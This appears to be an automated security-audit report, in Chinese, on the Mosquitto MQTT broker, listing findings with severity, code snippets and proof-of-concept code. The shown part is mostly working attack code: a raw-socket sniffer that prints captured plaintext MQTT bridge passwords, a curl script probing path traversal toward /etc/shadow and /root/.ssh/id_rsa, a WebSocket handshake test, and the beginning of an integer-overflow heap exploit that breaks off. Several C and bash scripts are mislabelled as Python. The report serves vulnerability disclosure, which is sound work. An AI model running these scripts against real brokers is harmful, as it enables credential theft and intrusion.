            print("[!] 注意：需要root权限运行此脚本")
            return True
        except PermissionError:
            print("[-] 错误：需要root权限才能创建原始套接字")
            return False
        except Exception as e:
            print(f"[-] 设置嗅探器失败: {e}")
            return False
            
    def parse_mqtt_packet(self, data):
        """解析MQTT数据包，提取明文密码"""
        if len(data) < 2:
            return None
            
        packet_type = data[0] & 0xF0
        remaining_length = data[1]
        
        if packet_type == CONNECT:
            return self._parse_connect_packet(data[2:])
        return None
        
    def _parse_connect_packet(self, data):
        """解析CONNECT包中的用户名和密码"""
        try:
            offset = 0
            
            # 协议名长度
            if len(data) < 2:
                return None
            proto_len = struct.unpack('!H', data[offset:offset+2])[0]
            offset += 2
            
            # 协议名
            if len(data) < offset + proto_len:
                return None
            proto_name = data[offset:offset+proto_len].decode('utf-8', errors='ignore')
            offset += proto_len
            
            # 协议级别
            if len(data) < offset + 1:
                return None
            proto_level = data[offset]
            offset += 1
            
            # 连接标志
            if len(data) < offset + 1:
                return None
            connect_flags = data[offset]
            offset += 1
            
            # 检查是否有用户名和密码标志
            has_username = bool(connect_flags & 0x80)
            has_password = bool(connect_flags & 0x40)
            
            # 保持连接时间
            if len(data) < offset + 2:
                return None
            keep_alive = struct.unpack('!H', data[offset:offset+2])[0]
            offset += 2
            
            # 客户端ID
            if len(data) < offset + 2:
                return None
            client_id_len = struct.unpack('!H', data[offset:offset+2])[0]
            offset += 2
            if len(data) < offset + client_id_len:
                return None
            client_id = data[offset:offset+client_id_len].decode('utf-8', errors='ignore')
            offset += client_id_len
            
            result = {
                'protocol': proto_name,
                'level': proto_level,
                'keep_alive': keep_alive,
                'client_id': client_id
            }
            
            # 提取用户名（明文）
            if has_username:
                if len(data) < offset + 2:
                    return None
                username_len = struct.unpack('!H', data[offset:offset+2])[0]
                offset += 2
                if len(data) < offset + username_len:
                    return None
                username = data[offset:offset+username_len].decode('utf-8', errors='ignore')
                result['username'] = username
                offset += username_len
                print(f"[!] 发现明文用户名: {username}")
            
            # 提取密码（明文！）
            if has_password:
                if len(data) < offset + 2:
                    return None
                password_len = struct.unpack('!H', data[offset:offset+2])[0]
                offset += 2
                if len(data) < offset + password_len:
                    return None
                password = data[offset:offset+password_len].decode('utf-8', errors='ignore')
                result['password'] = password
                print(f"[!] 发现明文密码: {password}")
                print(f"[!] 桥接客户端ID: {client_id}")
                print("[!] 漏洞利用成功：密码以明文形式在网络中传输")
            
            return result
            
        except Exception as e:
            print(f"[-] 解析数据包时出错: {e}")
            return None
    
    def start_sniffing(self):
        """开始嗅探MQTT流量"""
        if not self.sock:
            return
            
        print("[*] 正在监听MQTT桥接连接...")
        print("[*] 按Ctrl+C停止")
        
        try:
            while True:
                packet, addr = self.sock.recvfrom(65535)
                
                # 简单过滤：检查是否为TCP数据包
                if len(packet) < 34:  # 最小以太网+IP+TCP头
                    continue
                    
                # 提取TCP负载
                ip_header_len = (packet[14] & 0x0F) * 4
                tcp_header_offset = 14 + ip_header_len
                
                if len(packet) < tcp_header_offset + 20:
                    continue
                    
                # 检查目标端口是否为MQTT端口
                tcp_header = packet[tcp_header_offset:tcp_header_offset+20]
                dst_port = struct.unpack('!H', tcp_header[2:4])[0]
                src_port = struct.unpack('!H', tcp_header[0:2])[0]
                
                if dst_port == self.port or src_port == self.port:
                    # 提取TCP数据
                    data_offset = (tcp_header[12] >> 4) * 4
                    payload_start = tcp_header_offset + data_offset
                    
                    if len(packet) > payload_start:
                        payload = packet[payload_start:]
                        result = self.parse_mqtt_packet(payload)
                        if result and 'password' in result:
                            print("\n[+] 成功捕获桥接凭据！")
                            print(f"[+] 用户名: {result.get('username', 'N/A')}")
                            print(f"[+] 密码: {result['password']}")
                            print(f"[+] 客户端ID: {result['client_id']}")
                            print("="*50)
                            
        except KeyboardInterrupt:
            print("\n[*] 嗅探已停止")
        finally:
            if self.sock:
                self.sock.close()

def main():
    parser = argparse.ArgumentParser(description='Mosquitto Bridge密码泄露PoC - 仅供研究使用')
    parser.add_argument('-i', '--interface', default='eth0', help='网络接口（默认: eth0）')
    parser.add_argument('-p', '--port', type=int, default=1883, help='MQTT端口（默认: 1883）')
    
    args = parser.parse_args()
    
    print("="*60)
    print("Mosquitto Bridge 密码明文泄露漏洞 PoC")
    print("漏洞ID: VULN-1099CEDB")
    print("仅供研究使用 - 请勿用于非法用途")
    print("="*60)
    print()
    
    sniffer = MQTTSniffer(args.interface, args.port)
    if sniffer.setup_sniffer():
        sniffer.start_sniffing()

if __name__ == "__main__":
    main()
```

---

### VULN-2E1DC157 - 字符串比较逻辑缺陷

- **严重等级:** MEDIUM
- **文件位置:** `src/bridge_topic.c:120`
- **数据流:** 在bridge__find_topic函数中，当两个指针都为NULL时，比较会跳过，可能导致误判为匹配
- **判断理由:** 当cur_topic->topic为NULL且topic也为NULL时，比较被跳过，但此时应该视为匹配。然而如果cur_topic->topic为NULL而topic不为NULL，或者相反，比较也被跳过，可能导致不匹配的情况被误判为匹配。这是一个逻辑缺陷，可能导致重复添加或错误匹配。

**代码片段:**
```
if(cur_topic->topic != NULL && topic != NULL){
    if(strcmp(cur_topic->topic, topic)){
        continue;
    }
}
if(cur_topic->local_prefix != NULL && local_prefix != NULL){
    if(strcmp(cur_topic->local_prefix, local_prefix)){
        continue;
    }
}
if(cur_topic->remote_prefix != NULL && remote_prefix != NULL){
    if(strcmp(cur_topic->remote_prefix, remote_prefix)){
        continue;
    }
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: bridge__find_topic 函数中的字符串比较逻辑缺陷
 * 影响: Mosquitto MQTT Broker 桥接主题查找逻辑错误
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 模拟数据结构 */
struct mosquitto__bridge_topic {
    char *topic;
    char *local_prefix;
    char *remote_prefix;
    int direction;
    int qos;
    struct mosquitto__bridge_topic *next;
};

struct mosquitto__bridge {
    struct mosquitto__bridge_topic *topics;
};

/* 模拟链表宏 */
#define LL_FOREACH(head, el) for(el = head; el != NULL; el = el->next)

/* 模拟 bridge__find_topic 函数（包含漏洞） */
static struct mosquitto__bridge_topic *bridge__find_topic_vulnerable(
    struct mosquitto__bridge *bridge, 
    const char *topic, 
    int direction, 
    uint8_t qos, 
    const char *local_prefix, 
    const char *remote_prefix)
{
    struct mosquitto__bridge_topic *cur_topic = NULL;
    bool found = false;

    LL_FOREACH(bridge->topics, cur_topic) {
        if (cur_topic->direction != direction) {
            continue;
        }
        if (cur_topic->qos != qos) {
            continue;
        }
        
        /* 漏洞点：当两个指针都为NULL时跳过比较，但语义上应视为匹配 */
        /* 更严重的是：当一个为NULL另一个不为NULL时也跳过比较 */
        if (cur_topic->topic != NULL && topic != NULL) {
            if (strcmp(cur_topic->topic, topic)) {
                continue;
            }
        }
        if (cur_topic->local_prefix != NULL && local_prefix != NULL) {
            if (strcmp(cur_topic->local_prefix, local_prefix)) {
                continue;
            }
        }
        if (cur_topic->remote_prefix != NULL && remote_prefix != NULL) {
            if (strcmp(cur_topic->remote_prefix, remote_prefix)) {
                continue;
            }
        }
        found = true;
        break;
    }
    
    if (!found) {
        cur_topic = NULL;
    }
    return cur_topic;
}

/* 修复后的版本（用于对比） */
static struct mosquitto__bridge_topic *bridge__find_topic_fixed(
    struct mosquitto__bridge *bridge, 
    const char *topic, 
    int direction, 
    uint8_t qos, 
    const char *local_prefix, 
    const char *remote_prefix)
{
    struct mosquitto__bridge_topic *cur_topic = NULL;
    bool found = false;

    LL_FOREACH(bridge->topics, cur_topic) {
        if (cur_topic->direction != direction) {
            continue;
        }
        if (cur_topic->qos != qos) {
            continue;
        }
        
        /* 修复：正确处理NULL指针情况 */
        if (cur_topic->topic == NULL && topic == NULL) {
            /* 两者都为NULL，视为匹配 */
        } else if (cur_topic->topic == NULL || topic == NULL) {
            /* 一个为NULL另一个不为NULL，不匹配 */
            continue;
        } else if (strcmp(cur_topic->topic, topic)) {
            continue;
        }
        
        if (cur_topic->local_prefix == NULL && local_prefix == NULL) {
            /* 两者都为NULL，视为匹配 */
        } else if (cur_topic->local_prefix == NULL || local_prefix == NULL) {
            /* 一个为NULL另一个不为NULL，不匹配 */
            continue;
        } else if (strcmp(cur_topic->local_prefix, local_prefix)) {
            continue;
        }
        
        if (cur_topic->remote_prefix == NULL && remote_prefix == NULL) {
            /* 两者都为NULL，视为匹配 */
        } else if (cur_topic->remote_prefix == NULL || remote_prefix == NULL) {
            /* 一个为NULL另一个不为NULL，不匹配 */
            continue;
        } else if (strcmp(cur_topic->remote_prefix, remote_prefix)) {
            continue;
        }
        
        found = true;
        break;
    }
    
    if (!found) {
        cur_topic = NULL;
    }
    return cur_topic;
}

/* 辅助函数：创建桥接主题节点 */
struct mosquitto__bridge_topic *create_topic_node(
    const char *topic, 
    const char *local_prefix, 
    const char *remote_prefix,
    int direction,
    int qos)
{
    struct mosquitto__bridge_topic *node = malloc(sizeof(struct mosquitto__bridge_topic));
    node->topic = topic ? strdup(topic) : NULL;
    node->local_prefix = local_prefix ? strdup(local_prefix) : NULL;
    node->remote_prefix = remote_prefix ? strdup(remote_prefix) : NULL;
    node->direction = direction;
    node->qos = qos;
    node->next = NULL;
    return node;
}

/* 辅助函数：释放节点 */
void free_topic_node(struct mosquitto__bridge_topic *node) {
    if (node) {
        free(node->topic);
        free(node->local_prefix);
        free(node->remote_prefix);
        free(node);
    }
}

int main() {
    printf("=== PoC: Mosquitto Bridge Topic 查找逻辑缺陷 ===\n");
    printf("仅供研究使用\n\n");
    
    struct mosquitto__bridge bridge = {NULL};
    struct mosquitto__bridge_topic *result;
    
    /* 场景1: 两个topic都为NULL时，应视为匹配 */
    printf("\n[场景1] 两个topic都为NULL\n");
    {
        struct mosquitto__bridge_topic *node = create_topic_node(
            NULL, "local/", "remote/", 0, 1);
        bridge.topics = node;
        
        printf("  存储的topic: NULL\n");
        printf("  查找的topic: NULL\n");
        
        result = bridge__find_topic_vulnerable(&bridge, NULL, 0, 1, "local/", "remote/");
        printf("  漏洞版本结果: %s\n", result ? "找到匹配 (正确)" : "未找到 (错误)");
        
        result = bridge__find_topic_fixed(&bridge, NULL, 0, 1, "local/", "remote/");
        printf("  修复版本结果: %s\n", result ? "找到匹配 (正确)" : "未找到 (错误)");
        
        free_topic_node(node);
        bridge.topics = NULL;
    }
    
    /* 场景2: 存储的topic为NULL，查找的topic不为NULL - 应不匹配 */
    printf("\n[场景2] 存储topic=NULL, 查找topic=\"sensor/temp\"\n");
    {
        struct mosquitto__bridge_topic *node = create_topic_node(
            NULL, "local/", "remote/", 0, 1);
        bridge.topics = node;
        
        printf("  存储的topic: NULL\n");
        printf("  查找的topic: \"sensor/temp\"\n");
        
        result = bridge__find_topic_vulnerable(&bridge, "sensor/temp", 0, 1, "local/", "remote/");
        printf("  漏洞版本结果: %s (错误匹配!)\n", result ? "找到匹配 (错误!)" : "未找到 (正确)");
        
        result = bridge__find_topic_fixed(&bridge, "sensor/temp", 0, 1, "local/", "remote/");
        printf("  修复版本结果: %s\n", result ? "找到匹配 (错误!)" : "未找到 (正确)");
        
        free_topic_node(node);
        bridge.topics = NULL;
    }
    
    /* 场景3: 存储的topic不为NULL，查找的topic为NULL - 应不匹配 */
    printf("\n[场景3] 存储topic=\"sensor/temp\", 查找topic=NULL\n");
    {
        struct mosquitto__bridge_topic *node = create_topic_node(
            "sensor/temp", "local/", "remote/", 0, 1);
        bridge.topics = node;
        
        printf("  存储的topic: \"sensor/temp\"\n");
        printf("  查找的topic: NULL\n");
        
        result = bridge__find_topic_vulnerable(&bridge, NULL, 0, 1, "local/", "remote/");
        printf("  漏洞版本结果: %s (错误匹配!)\n", result ? "找到匹配 (错误!)" : "未找到 (正确)");
        
        result = bridge__find_topic_fixed(&bridge, NULL, 0, 1, "local/", "remote/");
        printf("  修复版本结果: %s\n", result ? "找到匹配 (错误!)" : "未找到 (正确)");
        
        free_topic_node(node);
        bridge.topics = NULL;
    }
    
    /* 场景4: 正常匹配情况 - 两个topic相同 */
    printf("\n[场景4] 正常匹配: 两个topic相同\n");
    {
        struct mosquitto__bridge_topic *node = create_topic_node(
            "sensor/temp", "local/", "remote/", 0, 1);
        bridge.topics = node;
        
        printf("  存储的topic: \"sensor/temp\"\n");
        printf("  查找的topic: \"sensor/temp\"\n");
        
        result = bridge__find_topic_vulnerable(&bridge, "sensor/temp", 0, 1, "local/", "remote/");
        printf("  漏洞版本结果: %s\n", result ? "找到匹配 (正确)" : "未找到 (错误)");
        
        result = bridge__find_topic_fixed(&bridge, "sensor/temp", 0, 1, "local/", "remote/");
        printf("  修复版本结果: %s\n", result ? "找到匹配 (正确)" : "未找到 (错误)");
        
        free_topic_node(node);
        bridge.topics = NULL;
    }
    
    /* 场景5: 复杂场景 - 多个节点，验证查找逻辑 */
    printf("\n[场景5] 复杂场景: 多个节点\n");
    {
        struct mosquitto__bridge_topic *node1 = create_topic_node(
            "topic1", "local1/", "remote1/", 0, 1);
        struct mosquitto__bridge_topic *node2 = create_topic_node(
            NULL, "local2/", "remote2/", 0, 1);
        struct mosquitto__bridge_topic *node3 = create_topic_node(
            "topic3", NULL, "remote3/", 0, 1);
        
        node1->next = node2;
        node2->next = node3;
        bridge.topics = node1;
        
        printf("  节点1: topic=\"topic1\", local=\"local1/\", remote=\"remote1/\"\n");
        printf("  节点2: topic=NULL, local=\"local2/\", remote=\"remote2/\"\n");
        printf("  节点3: topic=\"topic3\", local=NULL, remote=\"remote3/\"\n");
        printf("\n  查找: topic=NULL, local=\"local2/\", remote=\"remote2/\"\n");
        
        result = bridge__find_topic_vulnerable(&bridge, NULL, 0, 1, "local2/", "remote2/");
        printf("  漏洞版本: %s\n", result ? "找到节点2 (正确)" : "未找到 (错误)");
        
        result = bridge__find_topic_fixed(&bridge, NULL, 0, 1, "local2/", "remote2/");
        printf("  修复版本: %s\n", result ? "找到节点2 (正确)" : "未找到 (错误)");
        
        printf("\n  查找: topic=\"topic1\", local=\"local2/\", remote=\"remote2/\"\n");
        printf("  (topic不同但漏洞版本会错误匹配到节点2)\n");
        
        result = bridge__find_topic_vulnerable(&bridge, "topic1", 0, 1, "local2/", "remote2/");
        printf("  漏洞版本: %s (错误匹配到节点2!)\n", result ? "找到匹配 (错误!)" : "未找到 (正确)");
        
        result = bridge__find_topic_fixed(&bridge, "topic1", 0, 1, "local2/", "remote2/");
        printf("  修复版本: %s\n", result ? "找到匹配 (错误!)" : "未找到 (正确)");
        
        free_topic_node(node1);
        free_topic_node(node2);
        free_topic_node(node3);
        bridge.topics = NULL;
    }
    
    printf("\n=== PoC 完成 ===\n");
    return 0;
}
```

---

### VULN-723840C1 - 资源泄漏 - 错误处理路径不完整

- **严重等级:** MEDIUM
- **文件位置:** `src/bridge_topic.c:195`
- **数据流:** 在bridge__add_topic函数的错误处理标签中，释放了所有分配的内存，但bridge->topic_count已经递增
- **判断理由:** 在函数开头bridge->topic_count++已经执行，如果后续分配失败跳转到error标签，topic_count不会回滚，导致计数不准确。虽然不会造成直接的安全漏洞，但可能导致后续逻辑错误。

**代码片段:**
```
error:
    mosquitto_FREE(cur_topic->local_prefix);
    mosquitto_FREE(cur_topic->remote_prefix);
    mosquitto_FREE(cur_topic->local_topic);
    mosquitto_FREE(cur_topic->remote_topic);
    mosquitto_FREE(cur_topic->topic);
    mosquitto_FREE(cur_topic);
    log__printf(NULL, MOSQ_LOG_ERR, "Error: Out of memory.");
    return MOSQ_ERR_NOMEM;
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: VULN-723840C1 - bridge__add_topic函数中topic_count计数不一致
 * 
 * 此PoC演示了在内存分配失败时，bridge->topic_count不会回滚的问题
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* 模拟mosquitto内部结构 */
#define MOSQ_ERR_SUCCESS 0
#define MOSQ_ERR_NOMEM 1
#define MOSQ_ERR_INVAL 2

enum mosquitto__bridge_direction {
    bd_out = 0,
    bd_in = 1,
    bd_both = 2
};

struct mosquitto__bridge_topic {
    char *local_prefix;
    char *remote_prefix;
    char *local_topic;
    char *remote_topic;
    char *topic;
    enum mosquitto__bridge_direction direction;
    uint8_t qos;
    struct mosquitto__bridge_topic *next, *prev;
};

struct mosquitto__bridge {
    struct mosquitto__bridge_topic *topics;
    int topic_count;
};

/* 模拟内存分配失败 */
static int fail_count = 0;
static int fail_after = -1;

void* mock_malloc(size_t size) {
    if (fail_after >= 0 && fail_count++ >= fail_after) {
        printf("[PoC] 模拟内存分配失败 (第%d次分配)\n", fail_count);
        return NULL;
    }
    void *ptr = malloc(size);
    printf("[PoC] 分配内存: %p (大小: %zu)\n", ptr, size);
    return ptr;
}

char* mock_strdup(const char *str) {
    if (!str) return NULL;
    size_t len = strlen(str);
    char *new_str = (char*)mock_malloc(len + 1);
    if (new_str) {
        strcpy(new_str, str);
    }
    return new_str;
}

/* 模拟漏洞函数的关键部分 */
int bridge__add_topic_poc(struct mosquitto__bridge *bridge, 
                          const char *topic, 
                          enum mosquitto__bridge_direction direction, 
                          uint8_t qos, 
                          const char *local_prefix, 
                          const char *remote_prefix) {
    struct mosquitto__bridge_topic *cur_topic;
    int rc;
    
    printf("\n[PoC] 调用 bridge__add_topic\n");
    printf("[PoC] 当前 topic_count: %d\n", bridge->topic_count);
    
    /* 漏洞点: topic_count在内存分配前递增 */
    bridge->topic_count++;
    printf("[PoC] topic_count 已递增为: %d\n", bridge->topic_count);
    
    /* 分配cur_topic结构 */
    cur_topic = (struct mosquitto__bridge_topic*)mock_malloc(sizeof(struct mosquitto__bridge_topic));
    if (!cur_topic) {
        printf("[PoC] cur_topic 分配失败!\n");
        goto error;
    }
    memset(cur_topic, 0, sizeof(struct mosquitto__bridge_topic));
    
    /* 分配topic字符串 */
    if (topic) {
        cur_topic->topic = mock_strdup(topic);
        if (!cur_topic->topic) {
            printf("[PoC] topic 字符串分配失败!\n");
            goto error;
        }
    }
    
    /* 分配local_prefix */
    if (local_prefix) {
        cur_topic->local_prefix = mock_strdup(local_prefix);
        if (!cur_topic->local_prefix) {
            printf("[PoC] local_prefix 分配失败!\n");
            goto error;
        }
    }
    
    /* 分配remote_prefix */
    if (remote_prefix) {
        cur_topic->remote_prefix = mock_strdup(remote_prefix);
        if (!cur_topic->remote_prefix) {
            printf("[PoC] remote_prefix 分配失败!\n");
            goto error;
        }
    }
    
    /* 分配local_topic */
    cur_topic->local_topic = mock_strdup("local_topic");
    if (!cur_topic->local_topic) {
        printf("[PoC] local_topic 分配失败!\n");
        goto error;
    }
    
    /* 分配remote_topic */
    cur_topic->remote_topic = mock_strdup("remote_topic");
    if (!cur_topic->remote_topic) {
        printf("[PoC] remote_topic 分配失败!\n");
        goto error;
    }
    
    cur_topic->direction = direction;
    cur_topic->qos = qos;
    
    printf("[PoC] 成功添加topic, 最终 topic_count: %d\n", bridge->topic_count);
    return MOSQ_ERR_SUCCESS;
    
error:
    /* 漏洞: 释放了内存但没有回滚topic_count */
    printf("[PoC] 进入错误处理路径\n");
    printf("[PoC] 释放分配的内存...\n");
    
    if (cur_topic) {
        if (cur_topic->local_prefix) free(cur_topic->local_prefix);
        if (cur_topic->remote_prefix) free(cur_topic->remote_prefix);
        if (cur_topic->local_topic) free(cur_topic->local_topic);
        if (cur_topic->remote_topic) free(cur_topic->remote_topic);
        if (cur_topic->topic) free(cur_topic->topic);
        free(cur_topic);
    }
    
    /* 漏洞: 缺少 bridge->topic_count--; */
    printf("[PoC] 错误处理后 topic_count: %d (应该为 %d)\n", 
           bridge->topic_count, bridge->topic_count - 1);
    printf("[PoC] 漏洞: topic_count 未回滚!\n");
    
    return MOSQ_ERR_NOMEM;
}

int main() {
    printf("========================================\n");
    printf("PoC: VULN-723840C1 - topic_count 不一致\n");
    printf("仅供研究使用\n");
    printf("========================================\n\n");
    
    struct mosquitto__bridge bridge;
    memset(&bridge, 0, sizeof(bridge));
    
    printf("测试场景1: 正常添加topic\n");
    printf("------------------------\n");
    fail_after = -1;  /* 不触发分配失败 */
    fail_count = 0;
    
    int rc = bridge__add_topic_poc(&bridge, "test/topic", bd_out, 1, "local/", "remote/");
    printf("返回码: %d, topic_count: %d\n\n", rc, bridge.topic_count);
    
    printf("测试场景2: 触发内存分配失败\n");
    printf("---------------------------\n");
    fail_after = 3;  /* 第3次分配失败 (remote_prefix分配) */
    fail_count = 0;
    
    rc = bridge__add_topic_poc(&bridge, "test/topic2", bd_in, 0, "local2/", "remote2/");
    printf("返回码: %d, topic_count: %d\n\n", rc, bridge.topic_count);
    
    printf("测试场景3: 验证计数不一致的影响\n");
    printf("-------------------------------\n");
    printf("当前 topic_count: %d\n", bridge.topic_count);
    printf("实际成功添加的topic数: 1\n");
    printf("差异: %d\n", bridge.topic_count - 1);
    
    if (bridge.topic_count != 1) {
        printf("\n[漏洞确认] topic_count (%d) 与实际topic数量 (1) 不一致!\n", 
               bridge.topic_count);
        printf("这可能导致后续逻辑错误，例如:\n");
        printf("  - 遍历topic时访问无效指针\n");
        printf("  - 统计信息不准确\n");
        printf("  - 资源管理错误\n");
    }
    
    printf("\n========================================\n");
    printf("PoC 执行完毕\n");
    printf("========================================\n");
    
    return 0;
}
```

---

### VULN-2C19EB2A - 信息泄露 - 路径遍历错误信息

- **严重等级:** MEDIUM
- **文件位置:** `src\http_api.c:96`
- **数据流:** realpath()失败时，根据不同的errno值返回不同的HTTP状态码。攻击者可以通过构造特定的URL路径来触发不同的错误，从而推断文件系统的状态信息
- **判断理由:** 不同的错误码泄露了不同的系统信息：EACCES表示文件存在但权限不足，ENOENT表示文件不存在，ELOOP表示存在符号链接循环等。攻击者可以利用这些不同的错误响应来探测文件系统的结构和权限配置，进行信息收集

**代码片段:**
```
if(!resolved){
		if(errno == EACCES){
			*error_code = MHD_HTTP_FORBIDDEN;
		}else if(errno == EINVAL || errno == EIO || errno == ELOOP){
			*error_code = MHD_HTTP_INTERNAL_SERVER_ERROR;
		}else if(errno == ENAMETOOLONG){
			*error_code = MHD_HTTP_URI_TOO_LONG;
		}else if(errno == ENOENT || errno == ENOTDIR){
			*error_code = MHD_HTTP_NOT_FOUND;
		}
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 路径遍历信息泄露漏洞PoC
# 目标: 通过差异化HTTP错误码探测文件系统状态

TARGET="http://target-server:8080"
HTTP_DIR="/var/www/mosquitto"  # 假设的HTTP根目录

echo "[*] 开始探测文件系统信息..."
echo ""

# 测试1: 探测不存在的文件 (预期返回404)
echo "[测试1] 访问不存在的文件:"
curl -s -o /dev/null -w "HTTP状态码: %{http_code}\n" "$TARGET/nonexistent_file.html"

# 测试2: 探测存在的文件但权限不足 (预期返回403)
echo ""
echo "[测试2] 访问权限受限的文件:"
# 假设/etc/shadow存在但不可读
curl -s -o /dev/null -w "HTTP状态码: %{http_code}\n" "$TARGET/../../../etc/shadow"

# 测试3: 探测路径过长 (预期返回414)
echo ""
echo "[测试3] 构造超长路径:"
LONG_PATH=$(python3 -c "print('A'*5000)")
curl -s -o /dev/null -w "HTTP状态码: %{http_code}\n" "$TARGET/$LONG_PATH"

# 测试4: 探测符号链接循环 (预期返回500)
echo ""
echo "[测试4] 构造符号链接循环:"
# 如果服务器上有符号链接循环，访问会触发ELOOP
curl -s -o /dev/null -w "HTTP状态码: %{http_code}\n" "$TARGET/loop/loop/loop"

# 测试5: 探测目录遍历 (预期返回404或403)
echo ""
echo "[测试5] 目录遍历探测:"
for path in "/etc/passwd" "/etc/hosts" "/proc/self/environ" "/var/log/syslog"; do
    echo -n "  $path: "
    curl -s -o /dev/null -w "%{http_code}\n" "$TARGET/../..$path"
done

# 测试6: 探测文件存在性 (通过403 vs 404区分)
echo ""
echo "[测试6] 文件存在性探测:"
# 如果返回403，说明文件存在但权限不足
# 如果返回404，说明文件不存在
for path in "/etc/shadow" "/etc/passwd" "/root/.ssh/id_rsa" "/var/log/auth.log"; do
    echo -n "  $path: "
    curl -s -o /dev/null -w "%{http_code}\n" "$TARGET/../..$path"
done

echo ""
echo "[*] 探测完成。通过分析HTTP状态码可以推断文件系统状态:"
echo "    403 = 文件存在但权限不足"
echo "    404 = 文件不存在"
echo "    414 = 路径过长"
echo "    500 = 符号链接循环或I/O错误"
```

---

### VULN-F78D0AF9 - 不安全的WebSocket子协议处理 - 缺少长度验证

- **严重等级:** MEDIUM
- **文件位置:** `src\http_serv.c:127`
- **数据流:** 用户通过Sec-WebSocket-Protocol头提供子协议值，该值直接用于后续响应构造
- **判断理由:** 子协议匹配使用strncmp但未检查value_len是否等于目标字符串长度，可能导致部分匹配。例如，value为'mqtt-extra'且value_len为10时，strncmp(http_headers[i].value, "mqtt", 10)会返回0（匹配），但实际子协议不是'mqtt'。这可能导致不正确的子协议协商

**代码片段:**
```
if(!strncmp(http_headers[i].value, "mqtt", http_headers[i].value_len)
					|| !strncmp(http_headers[i].value, "mqttv3.1", http_headers[i].value_len)){

				subprotocol = http_headers[i].value;
				subprotocol_len = (int)http_headers[i].value_len;
			}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC代码 - 仅供研究使用
漏洞: 不安全的WebSocket子协议处理 - 缺少长度验证
"""

import socket
import base64
import hashlib
import struct

def create_websocket_request(host, port, subprotocol_value):
    """
    构造恶意的WebSocket升级请求
    
    利用原理:
    代码中使用 strncmp(http_headers[i].value, "mqtt", http_headers[i].value_len)
    只检查前缀匹配，不检查长度是否相等。
    因此发送 "mqtt-extra" 会匹配成功，但实际不是标准mqtt子协议。
    """
    
    # 生成随机的WebSocket key
    import os
    ws_key = base64.b64encode(os.urandom(16)).decode()
    
    # 构造HTTP请求
    request = (
        f"GET /mqtt HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {ws_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Protocol: {subprotocol_value}\r\n"
        f"\r\n"
    )
    return request.encode()

def test_exploit(host="127.0.0.1", port=8080):
    """
    测试漏洞利用
    """
    print("[*] 漏洞利用测试 - 仅供研究使用")
    print(f"[*] 目标: {host}:{port}")
    
    # 测试用例1: 正常mqtt子协议
    print("\n[测试1] 发送正常mqtt子协议请求...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.send(create_websocket_request(host, port, "mqtt"))
        response = sock.recv(4096)
        print(f"[+] 响应: {response[:200]}")
        if b"101" in response:
            print("[+] 正常mqtt子协议协商成功")
    except Exception as e:
        print(f"[-] 错误: {e}")
    finally:
        sock.close()
    
    # 测试用例2: 利用漏洞 - 发送恶意子协议
    print("\n[测试2] 发送恶意子协议 'mqtt-extra'...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.send(create_websocket_request(host, port, "mqtt-extra"))
        response = sock.recv(4096)
        print(f"[+] 响应: {response[:200]}")
        if b"101" in response:
            print("[!] 漏洞确认: 恶意子协议 'mqtt-extra' 被接受!")
            print("[!] 服务器错误地将非标准子协议识别为mqtt")
        else:
            print("[-] 请求被拒绝")
    except Exception as e:
        print(f"[-] 错误: {e}")
    finally:
        sock.close()
    
    # 测试用例3: 更复杂的利用
    print("\n[测试3] 发送更复杂的恶意子协议 'mqttv3.1-exploit'...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.send(create_websocket_request(host, port, "mqttv3.1-exploit"))
        response = sock.recv(4096)
        print(f"[+] 响应: {response[:200]}")
        if b"101" in response:
            print("[!] 漏洞确认: 恶意子协议 'mqttv3.1-exploit' 被接受!")
    except Exception as e:
        print(f"[-] 错误: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 2:
        test_exploit(sys.argv[1], int(sys.argv[2]))
    else:
        test_exploit()
```

---

### VULN-F00B844D - 缓冲区溢出/未初始化内存访问

- **严重等级:** HIGH
- **文件位置:** `src\loop.c:72`
- **数据流:** 用户输入通过pub_msg->payloadlen和pub_msg->payload传入，在single_publish函数中分配内存并复制数据。如果payloadlen为0，则分配1字节内存，memcpy复制0字节，但零终止符写入是安全的。然而，如果payloadlen非常大（如UINT32_MAX），则payloadlen+1会溢出为0，导致malloc(0)返回小内存块，后续memcpy造成堆缓冲区溢出。
- **判断理由:** payloadlen是uint32_t类型，当payloadlen为UINT32_MAX时，payloadlen+1溢出为0，mosquitto_malloc(0)可能返回一个有效指针但内存很小，后续memcpy复制UINT32_MAX字节数据会导致严重的堆缓冲区溢出。这是一个经典的整数溢出漏洞。

**代码片段:**
```
base_msg->data.payload = mosquitto_malloc(base_msg->data.payloadlen+1);
if(base_msg->data.payload == NULL){
    db__msg_store_free(base_msg);
    return MOSQ_ERR_NOMEM;
}
/* Ensure payload is always zero terminated, this is the reason for the extra byte above */
((uint8_t *)base_msg->data.payload)[base_msg->data.payloadlen] = 0;
memcpy(base_msg->data.payload, pub_msg->payload, base_msg->data.payloadlen);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-F00B844D - Mosquitto Broker Integer Overflow Heap Buffer Overflow
仅供研究使用 (For Research Purposes Only)
"""

import socket
import struct
import sys

# MQTT协议常量
CONNECT = 0x10
CONNACK = 0x20
PUBLISH = 0x30

# 构建MQTT CONNECT报文
def build_connect():
    protocol_name = b"MQTT"
    protocol_level = 4  # MQTT 3.1.1
    connect_flags = 0x02  # Clean Session
    keep_alive = 60
    client_id = b"poc_exploit"
    
    # 可变头部
    variable_header = struct.pack("!H", len(protocol_name)) + protocol_name
    variable_header += struct.pack("!BB", protocol_level, connect_flags)
